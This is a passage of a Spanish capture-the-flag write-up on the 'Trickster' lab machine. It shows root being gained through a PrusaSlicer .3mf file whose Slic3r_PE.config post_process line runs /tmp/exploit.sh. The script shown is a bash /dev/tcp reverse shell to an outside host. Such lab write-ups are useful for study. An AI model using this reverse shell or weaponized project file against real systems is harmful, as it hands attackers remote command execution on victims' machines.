<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a></p></div><div class="el-p"><p dir="auto">Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;</p></div><div class="el-p"><p dir="auto">Para extraerlo usamos unzip o 7z cualquiera vale;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">total 64K
drwxrwxr-x <span class="token number">4</span> kali kali <span class="token number">4</span>,0K feb <span class="token number">14</span> <span class="token number">20</span>:00 <span class="token builtin class-name">.</span>
drwxrwxr-x <span class="token number">6</span> kali kali <span class="token number">4</span>,0K feb <span class="token number">14</span> <span class="token number">19</span>:52 <span class="token punctuation">..</span>
-rw-rw-r-- <span class="token number">1</span> kali kali  39K feb <span class="token number">14</span> <span class="token number">19</span>:52 evil.3mf
-rw-rw-r-- <span class="token number">1</span> kali kali   <span class="token number">42</span> feb <span class="token number">14</span> <span class="token number">19</span>:52 exploit.sh
drwxrwxr-x <span class="token number">5</span> kali kali <span class="token number">4</span>,0K feb <span class="token number">14</span> <span class="token number">20</span>:00 Extracted
drwxrwxr-x <span class="token number">8</span> kali kali <span class="token number">4</span>,0K feb <span class="token number">14</span> <span class="token number">19</span>:52 .git
-rw-rw-r-- <span class="token number">1</span> kali kali  <span class="token number">369</span> feb <span class="token number">14</span> <span class="token number">19</span>:52 README.md
➜  prusaslicer_exploit git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ tree Extracted 
Extracted
├── 3D
│   └── 3dmodel.model
├── <span class="token punctuation">[</span>Content_Types<span class="token punctuation">]</span>.xml
├── Metadata
│   ├── Slic3r_PE.config
│   ├── Slic3r_PE_model.config
│   └── thumbnail.png
└── _rels

<span class="token number">4</span> directories, <span class="token number">5</span> files

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">El exploit esta en el archivo <code>Slic3r_PE.config</code> que es el que ejecuta codigo arbitrario</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"> <span class="token function">cat</span> Extracted/Metadata/Slic3r_PE.config <span class="token operator">|</span> <span class="token function">grep</span> tmp
<span class="token punctuation">;</span> post_process <span class="token operator">=</span> <span class="token string">"chmod +x /tmp/exploit.sh"</span><span class="token punctuation">;</span><span class="token string">"bash /tmp/exploit.sh"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash</p></div><div class="el-p"><p dir="auto">Modificamos exploit.sh y lo movemos a /tmp</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">adam@trickster:~/prusaslicer_exploit$ <span class="token function">cat</span> /tmp/exploit.sh 
/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/10.10.14.232/2323 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h3 heading-wrapper"><h3 data-heading="Root!" dir="auto" class="heading" id="Root!"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Root!</h3><div class="heading-children"><div class="el-p"><p dir="auto"><span alt="Pasted image 20250215133235.png" src="Pasted image 20250215133235.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250215133235.png" src="machines/trickster/imgs/pasted-image-20250215133235.png"></span></p></div><div class="mod-footer mod-ui"></div></div></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/trickster/2.privesc.html#2.PrivEsc"><div class="tree-item-contents heading-link" heading-name="2.PrivEsc"><span class="tree-item-title">2.PrivEsc</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#Directorio_web"><div class="tree-item-contents heading-link" heading-name="Directorio web"><span class="tree-item-title">Directorio web</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#SUID_Binaries_/_GUID_Bins"><div class="tree-item-contents heading-link" heading-name="SUID Binaries / GUID Bins"><span class="tree-item-title">SUID Binaries / GUID Bins</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#Conexiones_tcp/udp"><div class="tree-item-contents heading-link" heading-name="Conexiones tcp/udp"><span class="tree-item-title">Conexiones tcp/udp</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#MariaDB"><div class="tree-item-contents heading-link" heading-name="MariaDB"><span class="tree-item-title">MariaDB</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#User_James"><div class="tree-item-contents heading-link" heading-name="User James"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">User James</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/trickster/2.privesc.html#Escaneo_de_Ips;"><div class="tree-item-contents heading-link" heading-name="Escaneo de Ips;"><span class="tree-item-title">Escaneo de Ips;</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/trickster/2.privesc.html#Escaneo_de_puertos"><div class="tree-item-contents heading-link" heading-name="Escaneo de puertos"><span class="tree-item-title">Escaneo de puertos</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/trickster/2.privesc.html#Pivoting"><div class="tree-item-contents heading-link" heading-name="Pivoting"><span class="tree-item-title">Pivoting</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/trickster/2.privesc.html#SSTI"><div class="tree-item-contents heading-link" heading-name="SSTI"><span class="tree-item-title">SSTI</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/trickster/2.privesc.html#CVE-2024-32651"><div class="tree-item-contents heading-link" heading-name="CVE-2024-32651"><span class="tree-item-title">CVE-2024-32651</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#STTi_p2"><div class="tree-item-contents heading-link" heading-name="STTi p2"><span class="tree-item-title">STTi p2</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/trickster/2.privesc.html#User_Adam"><div class="tree-item-contents heading-link" heading-name="User Adam"><span class="tree-item-title">User Adam</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/trickster/2.privesc.html#CVE-2023-47268"><div class="tree-item-contents heading-link" heading-name="CVE-2023-47268"><span class="tree-item-title">CVE-2023-47268</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/trickster/2.privesc.html#Poc"><div class="tree-item-contents heading-link" heading-name="Poc"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Poc</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/trickster/2.privesc.html#Root!"><div class="tree-item-contents heading-link" heading-name="Root!"><span class="tree-item-title">Root!</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>